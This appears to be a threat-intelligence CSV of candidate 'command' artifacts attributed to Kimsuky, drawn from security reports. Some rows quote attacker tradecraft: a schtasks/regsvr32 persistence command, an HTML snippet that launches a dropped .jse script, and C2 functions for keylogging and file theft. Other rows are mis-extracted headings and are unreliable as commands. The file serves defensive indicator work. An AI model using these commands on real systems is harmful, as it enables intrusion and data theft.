schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:ac9f29ec6856848329138bf4834b2555a4162cf03cceb2b377f644b73de03af6,observation--sha256:634682e29d65cab7e5dc473f1a4bbe6e07b40068c514b0951681c06b93a0e47d,command,"- schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\","- schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:706b1b7ffb3c24d8a1ed46d59d48db1fedf6541ad91723fa92582bfbb4654a71,observation--sha256:9acf9ead82f4e9321ea281b8cf8a1a052b4e3b56274c8d2d55942f9dbddfe94f,command,1 下载 Dll 模块使用 regsvr32 加载执行,1 下载 Dll 模块使用 regsvr32 加载执行,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 c 上传截图 d 上传文件 e 上传键盘记录、屏幕截图、文件监控、USB 监控数据 f 下载文件 0 CmdShell 1 下载 Dll 模块使用 regsvr32 加载执行 2 内存加载执行 PE 模块 3 下载文件并执行 其中键盘记录、屏幕截图、文件监控、USB 监控被放到单独线程中执行，除键盘记录 为即时监控外，文件监控频率为 60 秒，屏幕监控频率为 300 秒。而在文件监控中，木马针 对 txt、hwp、pdf、doc、xls、ppt 文档类型文件进行窃取，表明攻击者对此类文件非常感兴 趣。 图[13].窃取文件流程中特定的文档类型 3.4 间谍模块-Android 文件名称 Kisa Vaccine.apk SHA256 fe1a734019f0dc714bd3360e2369853ea97c02f108afe96376931893447 0967b,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8e4c1bc6062feb7c9a610fb0701f214083a73f73d36f08e2467e4789aea43e0e,observation--sha256:f20ab1839d2da133349440fac8c8806ece4c26be9a5464c6c9ff9dd919849c91,command,1. Downloads a PowerShell script from Google Drive and writes to disk as,1. Downloads a PowerShell script from Google Drive and writes to disk as,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d00597002af2dc1eeb3a1efa28d961bba2faead9f5bbc180ce80e653069c6147,observation--sha256:b663f8162601961769dcf4106a09369b6d93160a095044d71fccf3bf39761dbf,command,4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果,4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20]. 响应 C2 服务器远程指令 命令 动作 1 会提醒用户更新并进行更新操作 2 创建了 list.xls 和 zip.dat ，并遍历/sdcard 目录及其子文件夹下的 所有文件，把文件信息写入了 list.xls 3 上传指定的文件 4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果 写入 cmd_xxxxx.txt ,经过相同的伪装，调用 c.d() 上传 5 创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt 6 清除 app 的数据 7 清除 app 的缓存 8 发送短信 3.5 攻击韩国原子能研究所 韩国新闻媒体《朝鲜日报》近日报道韩国原子能研究院于 5 月 14 日遭到朝鲜 APT 组 织 Kimsuky 攻击。韩国原子能研究院拥有核电站、核燃料等重要国防资料。根据披露信息 显示，攻击者利用原子能研究院 VPN 设备漏洞进入内网，使用了 13 个未经授权的外部 IP 访问 VPN 内部网络。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e0c39b1eca625fc4447e38c4fbc9af00cc7f24f8f0748d249fabfc5ac0c5eaa1,observation--sha256:9e0065af82a75b4c28ffccf736d8af2e0a79e9deca2dae2de0008e68248464ba,command,4. 유사도분석(SimilarityAnalysis)..................................................284.1. 타임라인(Timeline).........................................................................284.2. VBS1유형.....................................................................................294.3. JSE1유형......................................................................................334.4. VBS2유형.....................................................................................364.5. JSE2유형......................................................................................404.6. JSE3유형......................................................................................484.7. 기타유형........................................................................................514.8. 경로및파일명유사도...................................................................... 534.9. HTML코드유사도...........................................................................544.10. Powershell 코드유사도..................................,4. 유사도분석(SimilarityAnalysis)..................................................284.1. 타임라인(Timeline).........................................................................284.2. VBS1유형.....................................................................................294.3. JSE1유형......................................................................................334.4. VBS2유형.....................................................................................364.5. JSE2유형......................................................................................404.6. JSE3유형......................................................................................484.7. 기타유형........................................................................................514.8. 경로및파일명유사도...................................................................... 534.9. HTML코드유사도...........................................................................544.10. Powershell 코드유사도,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 2}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport - 목차(CONTENTS) - 1. 개요(Overview)...........................................................................21.1. 위협식별(Threat Hunting)............................................................... 21.2. 공격전술및전략유형(TTPs)............................................................. 3 2. 공격시나리오(AttackScenario)....................................................32.1. 공격흐름도(AttackFlowchart)..........................................................32.2. 초기접근단계-피싱(Initial Acces,
1.0.0,actor--kimsuky,artifact--sha256:1a0ff74e537175005705c357a011108042732472148bfefd00e7fd09eef348fd,observation--sha256:19b432ecf557ede474f8313b71a7c8dd987cc0b9c7b1d72abcac11972b615d77,command,4.10. Powershell 코드유사도,4.10. Powershell 코드유사도,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:474103f643f393114175033182f943eaf8fbd3f7586d7e9c0a1ee1f011b99f54,observation--sha256:6af3d2d53f7fae18e5ad5f3b2ef4fb169952efd93b9a62bed0cce1b25fd72646,command,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--09cb3954225ee2bb,kimsuky/Unveil the evolution of Kimsuky targeting Android device with newly discovered mobile malware.xlsx,"{""row"": 7, ""sheet"": ""IoC""}",[],[],[],[],0,false,medium,TLP:CLEAR,xlsx-row,6.0 5D56371944DEC9DA57DB95D0199DD920 9722107FFF4F3B2255556E0CF4D367CCB73305C34B1746BAED31B16899EEFC4B Powershell Keylogger,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:51b5ec093fdf4ae241bfa06c5a5b33b822f813f17babe114279096c703c9c0fb,observation--sha256:17c64c2df42b3a7c8a9175fb25d445d3a5db52aac56cf07f7afc0e10557ebc1d,command,6.4 Signed binary proxy execution: Regsvr32,6.4 Signed binary proxy execution: Regsvr32,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:b2d1c8ec7cf843662d7500e50e1740fcd9b3191d6cdd1a437cdf0a1fb4bbfd15,observation--sha256:b386a2b2971f895e604db039d5a10d5f5b93394fe8a81605e35e70f1ed4dbeb6,command,As an example: below we can see implementation of a decoded PowerShell payload,As an example: below we can see implementation of a decoded PowerShell payload,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1f613e8cade6c6be0229458668aa20dcacc76e33427d7b820f5656342c4d3b07,observation--sha256:3d0fea34530d0dfe6d0f857cba2989191423001a1698c636e612860473650f58,command,Backdoor/Powershell.Agent (2020.10.06.00),Backdoor/Powershell.Agent (2020.10.06.00,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
